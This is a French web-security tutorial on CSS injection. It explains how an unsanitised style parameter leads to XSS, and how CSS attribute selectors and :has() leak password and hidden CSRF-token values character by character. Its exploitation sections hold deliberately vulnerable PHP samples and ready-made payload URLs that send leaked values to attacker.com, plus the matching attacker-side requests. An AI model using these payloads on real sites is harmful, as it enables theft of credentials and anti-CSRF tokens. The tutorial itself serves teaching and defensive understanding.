---
description: 06 Novembre 2022 (mis à jour le 19 Aout 2024)
---

# Les injections CSS - Attribute Selector

> Les injections CSS ne sont pas les vulnérabilités les plus connues, mais permettent tout de même certaines exploitations. Pour illustrer cela, nous commençons par la récupération de valeurs d'attributs HTML grâce aux sélecteurs d'attributs CSS.

## Utilisation des Feuilles de style en cascade (CSS)

Le [CSS](https://fr.wikipedia.org/wiki/Feuilles\_de\_style\_en\_cascade) est un langage informatique qui décrit la présentation des documents HTML et XML. Trois méthodes permettent d'appliquer un style aux documents.

### La feuille de style externe

La méthode la plus couramment utilisée est de lier directement la feuille de style :&#x20;

{% code overflow="wrap" %}
```css
h1 {
  color: red;
}
```
{% endcode %}

à la page HTML grâce à l'élément `<link>` :

{% code overflow="wrap" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <link rel="stylesheet" href="styles.css">
  </head>
  <body>
    <h1>Utilisation d'une feuille de style externe</h1>
  </body>
</html>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

### La feuille de style interne

La seconde méthode est d'utiliser une feuille de style interne directement dans le document HTML grâce à l'élément `<style></style>` :&#x20;

{% code overflow="wrap" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
      h1 {
        color: red;
      }
    </style>
  </head>
  <body>
    <h1>Utilisation d'une feuille de style interne (head)</h1>
  </body>
</html>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

Bien que l'ajout de la balise `<style></style>` se fait communément au sein de la balise `<head></head>`, rien n'empêche le développeur de l'ajouter au sein de la balise `<body></body>` :&#x20;

{% code overflow="wrap" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
  </head>
  <body>
    <style>
      h1 {
        color: red;
      }
    </style>
    <h1>Utilisation d'une feuille de style interne (body)</h1>
  </body>
</html>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

### Le style en ligne

Et finalement, la méthode sans doute la moins usitée est le style en ligne (inline style) :&#x20;

{% code overflow="wrap" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
  </head>
  <body>
    <h1 style="color: red;">Utilisation d'une feuille de style en linge (inline style)</h1>
  </body>
</html>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

## Exploitation d'une injection XSS via un élément CSS

Dans les cas les plus simples, une injection au sein d'un code CSS peut mener à une vulnérabilité de type Cross-Site Scripting (XSS) :

{% code overflow="wrap" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
      h1 {
        color: <?php echo $_GET['color']; ?>;
      }
  </style>
  </head>
  <body>
    <h1>Injection de type Cross-Site Scripting au sein de l'élément HTML style</h1>
  </body>
</html>
```
{% endcode %}

Bien que l'injection se situe au sein d'une balise `<style></style>`, aucune particularité liée au CSS n'intervient dans l'exploitation de cette vulnérabilité. Il suffit de procéder comme pour une XSS classique, c'est-à-dire ici de fermer la balise de style, puis de charger le code JavaScript désiré :&#x20;

<figure><img src="../../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

Suite à cette mésaventure, le développeur souhaite toujours laisser la possibilité à ses utilisateurs de personnaliser le style du site et notamment la couleur du titre de la page grâce au paramètre `color`, mais tout en protégeant son site. Etant maintenant sensibilisé aux vulnérabilités Web, la donnée non fiable est assainie par la méthode `htmlspecialchars()` transformant ainsi les caractères `<`, `>`, `"` et `'` en entités HTML.

{% code overflow="wrap" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
      h1 {
        color: <?php echo htmlspecialchars($_GET['color'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
      }
  </style>
  </head>
  <body>
    <h1>Assainissement de la donnée non fiable grâce à htmlspecialchars()</h1>
  </body>
</html>
```
{% endcode %}

&#x20;De ce fait, l'injection précédente n'est maintenant plus possible :&#x20;

<figure><img src="../../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

Dans ce cas, l'application est-elle maintenant correctement protégée ? Qu'elles sont les exploitations toujours possibles pour un tel code ?

## Exploitation d'une injection CSS

### Récupération de la valeur d'un attribut d'un élément HTML via les sélecteurs d'attribut CSS

En CSS, les sélecteurs d'attributs permettent d'effectuer un traitement sur un élément, selon un de ses attributs ou de leur valeur. Il est possible d'utiliser cette mécanique afin de récupérer de l'information grâce à une injection CSS.

Le code vulnérable exploité possède un élément HTML `<input>` de type `password` et ayant comme valeur le mot de passe de la victime :&#x20;

{% code overflow="wrap" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
      h1 {
       élément   color: <?php echo htmlspecialchars($_GET['color'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
      }
  </style>
  </head>
  <body>
    <h1>Exploitation d'une injection CSS</h1>
    <form method="POST" action="">
      <input type="password" name="password" value="azerty">
      <input type="submit" name="currentPassword" value="Continue">
    </form>
  </body>
</html>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

L'idée de l'exploitation va être d'utiliser les sélecteurs CSS afin de récupérer le mot de passe de la victime caractère par caractère. Voici un exemple de sélecteur d'attribut :

{% code overflow="wrap" %}
```html
<style>
  input[name=password][value^=valeur] {
    background-image:url(https://banque-images.com/background.png);
  }
</style>
```
{% endcode %}

Le style va s'appliquer pour les éléments HTML `<input>`, dont l'attribut `name` est égal à "password" et dont la `value` commence par (le caractère `^` indique le début de chaîne) "valeur". Si un tel élément est trouvé, alors le navigateur appliquera le style `background-image` en récupérant l'image disponible à l'URL spécifiée.

L'attaquant va ainsi modifier le sélecteur comme ceci :&#x20;

{% code overflow="wrap" %}
```html
<style>
  input[name=password][value^=a] {
    background-image:url(https://attacker.com/?leak=a);
  }
</style>
```
{% endcode %}

Et amener sa victime à suivre le lien malicieux exploitant l'injection :&#x20;

{% code overflow="wrap" %}
```
https://vulnerable.com/css-injection-element-password.php?color=black;}input[name=password][value^=a]{background-image:url(https://attacker.com/?leak=a);}
```
{% endcode %}

Lorsque le navigateur de la victime chargera la page, la condition sera remplie et une requête sera effectuée vers le serveur de l'attaquant :&#x20;

{% code overflow="wrap" %}
```http
GET /?leak=a HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Referer: https://vulnerable.com
Connection: close
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

L'attaquant continuera son attaque en itérant sur les prochains caractères :&#x20;

{% code overflow="wrap" %}
```
https://vulnerable.com/css-injection-element-password.php?color=black;}input[name=password][value^=az]{background-image:url(https://attacker.com/?leak=az);}
```
{% endcode %}

{% code overflow="wrap" %}
```http
GET /?leak=az HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Referer: https://vulnerable.com
Connection: close
```
{% endcode %}

### Récupération de la valeur d'un attribut d'un élément HTML de type hidden via les sélecteurs d'attribut CSS

Malheureusement, la technique précédente ne fonctionne pas sur les champs `<input>` de type `hidden`. Cela pourrait pourtant être utile dans le cas ou l'application vulnérable utilise des champs cachés pour transmettre des jetons anti-CSRF par exemple :

{% code overflow="wrap" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
      h1 {
        color: <?php echo htmlspecialchars($_GET['color'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
      }
  </style>
  </head>
  <body>
    <h1>Attribute selectors iframe with hidden input</h1>
    <form action="" method="POST">
        <input type="password" name="newPassword" placeholder="New Password">
        <input type="password" name="confirmNewPassword" placeholder="Confirm New Password">
        <input type="hidden" name="csrf-token" value="a5ccef6a-1f00-4a02-b16b-e4e9e517b223">
        <input type="submit" name="changePassword" value="Continue">
    </form>
  </body>
</html>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

Cela est en fait possible en utilisant les combinateurs `~` et `*` à la suite du sélecteur CSS :&#x20;

{% code overflow="wrap" %}
```html
<style>
  input[name=csrf-token][value^=a]~* {
    background-image:url(https://attacker.com/?leak=a);
  }
</style>
```
{% endcode %}

{% hint style="info" %}
Le combinateur `~` ([general sibling combinator](https://developer.mozilla.org/en-US/docs/Learn/CSS/Building\_blocks/Selectors/Combinators#general\_sibling\_combinator)) sélectionne les frères d'un élément, même dans le cas où ils ne sont pas adjacents, mais doivent avoir le même parent. Il est possible également d'utiliser le combinateur `+` ([adjacent sibling combinator](https://developer.mozilla.org/en-US/docs/Learn/CSS/Building\_blocks/Selectors/Combinators#adjacent\_sibling\_combinator)) mais son utilisation est alors plus restreinte.
{% endhint %}

{% hint style="info" %}
Le sélecteur`*` ([universal selector](https://developer.mozilla.org/en-US/docs/Web/CSS/Universal\_selectors)) correspond à un élément de n'importe quel type.
{% endhint %}

Le lien malicieux devenant alors :&#x20;

{% code overflow="wrap" %}
```
https://vulnerable.com/css-injection-element-hidden.php?color=black;}input[name=csrf-token][value^=a]~*{background-image:url(https://attacker.com/?leak=a);}
```
{% endcode %}

Et la requête effectuée par le navigateur de la victime sera :&#x20;

{% code overflow="wrap" %}
```http
GET /?leak=a HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Referer: https://vulnerable.com
Connection: close
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

L'attaquant devra continuer son attaque pour récupérer ainsi les caractères restants :

{% code overflow="wrap" %}
```http
GET /?leak=ab4f63f9 HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Referer: https://vulnerable.com
Connection: close
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
L'inconvénient de ces techniques est qu'elles sont limitées à la récupération d'une information présente au sein d'un attribut. Impossible donc ici de récupérer le contenu d'un élément `<span></span>`, d'un `<script></script>` ou d'un paragraphe `<p></p>` par exemple.

Il existe toutefois d'autres techniques permettant cela et qui seront vues dans les prochaines parties de cet article.
{% endhint %}

### Récupération de la valeur d'un attribut d'un élément HTML de type hidden via la pseudo-class CSS `has()`

Une alternative pouvant répondre à certaines limites des combinateurs CSS est d'utiliser le sélecteur CSS `has()` de la façon suivante :&#x20;

{% code overflow="wrap" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
      h1 {
        color: <?php echo htmlspecialchars($_GET['color'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
      }
  </style>
  </head>
  <body>
    <h1>Has attribute selectors iframe with hidden input</h1>
    <form action="" method="POST">
        <input type="password" name="newPassword" placeholder="New Password">
        <input type="password" name="confirmNewPassword" placeholder="Confirm New Password">
        <input type="hidden" name="csrf-token" value="a5ccef6a-1f00-4a02-b16b-e4e9e517b223">
        <input type="submit" name="changePassword" value="Continue">
    </form>
  </body>
</html>
```
{% endcode %}

{% code overflow="wrap" %}
```html
<style>
  form:has(input[name=csrf-token][value^=a]) {
    background-image:url(https://attacker.com/?leak=a);
  }
</style>
```
{% endcode %}

### Automatisation de l'attaque

Un script d'automatisation exploitant l'injection CSS afin de récupérer une valeur d'un attribut existe déjà ici : [https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e). Son utilisation nécessite que la victime accède à la page malicieuse et que l'application vulnérable ciblée soit iframable (entêtes [X-Frame-Options](https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/X-Frame-Options) et [frame-ancestors](https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)). Toutefois, ce PoC ne possède pas la partie back-end. Il faudra donc le développer, mais il reste toutefois assez simple. De plus, étant donné qu'une seule requête est effectuée par position de caractère, il est possible que l'iframing résulte en une erreur HTTP `414 URI Too Long` et que l'attaque échoue.

Ci-dessous, plusieurs PoC tentant de résoudre ces problèmes.

#### PoC - Récupération de la valeur d'un attribut d'un élément HTML via les sélecteurs d'attribut CSS

Un PoC est disponible [ici](https://github.com/Sharpforce/cybersecurity-code/tree/master/les-injections-css-attribute-selector/attribute-selectors-iframe).

{% code overflow="wrap" %}
```html
<h1>Récupération de la valeur d'un attribut d'un élément HTML via les sélecteurs d'attribut CSS</h1>

<h2>PoC #1 - Champ de type password</h2>
<form method="POST" action="">
    <input type="password" name="password" value="qwerty">
    <input type="submit" name="currentPassword" value="Submit">
</form>
        
<h2>PoC #2 - Champ de type hidden</h2>
<form action="" method="POST">
    <input type="password" name="newPassword" placeholder="New Password">
    <input type="password" name="confirmNewPassword" placeholder="Confirm New Password">
    <input type="hidden" name="csrf-token" value="a5ccef6a-1f00-4a02-b16b-e4e9e517b223">
    <input type="submit" name="changePassword" value="Continue">
</form>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

#### PoC - Récupération de la valeur d'un attribut d'un élément HTML de type hidden via la pseudo-class CSS `has()`

Un PoC est disponible [ici](https://github.com/Sharpforce/cybersecurity-code/tree/master/les-injections-css-attribute-selector/has-attribute-selectors-iframe).

{% code overflow="wrap" %}
```html
<h1>Récupération de la valeur d'un attribut d'un élément HTML via la pseudo-class CSS has()</h1>
        
<h2>PoC #1 - Champ de type password</h2>
<form method="POST" action="">
    <input type="password" name="password" value="qwerty">
    <input type="submit" name="currentPassword" value="Submit">
</form>
        
<h2>PoC #2 - Champ de type hidden</h2>
<form action="" method="POST">
    <input type="password" name="newPassword" placeholder="New Password">
    <input type="password" name="confirmNewPassword" placeholder="Confirm New Password">
    <input type="hidden" name="csrf-token" value="a5ccef6a-1f00-4a02-b16b-e4e9e517b223">
    <input type="submit" name="changePassword" value="Continue">
</form>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

#### PoC - Récupération de la valeur d'un attribut d'un élément HTML via les Popups

Il existe une autre technique utilisant les popups et qui ne nécessite pas l'iframing du site vulnérable. Malheureusement, il faudra soit un clic en plus de la part de la victime afin de lancer l'attaque ou alors qu'il autorise l'ouverture des popups au sein de son navigateur. De plus, cette attaque est très bruyante puisque la victime voit directement les fenêtres s'ouvrir et se rafraichir.

Un PoC est disponible [ici](https://github.com/Sharpforce/cybersecurity-code/tree/master/les-injections-css-attribute-selector/attribute-selectors-popup).

{% code overflow="wrap" %}
```html
<h1>Récupération de la valeur d'un attribut d'un élément HTML via les sélecteurs d'attribut CSS</h1>
 
<h2>PoC #1 - Champ de type password</h2>
 <form method="POST" action="">
    <input type="password" name="password" value="qwerty">
    <input type="submit" name="currentPassword" value="Submit">
</form>
        
<h2>PoC #2 - Champ de type hidden</h2>
<form action="" method="POST">
    <input type="password" name="newPassword" placeholder="New Password">
    <input type="password" name="confirmNewPassword" placeholder="Confirm New Password">
    <!-- shorter csrf token due to URI too long error -->
    <input type="hidden" name="csrf-token" value="ab4f63f9ac65">
    <input type="submit" name="changePassword" value="Continue">
</form>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

## Références

* [https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
* [https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e)
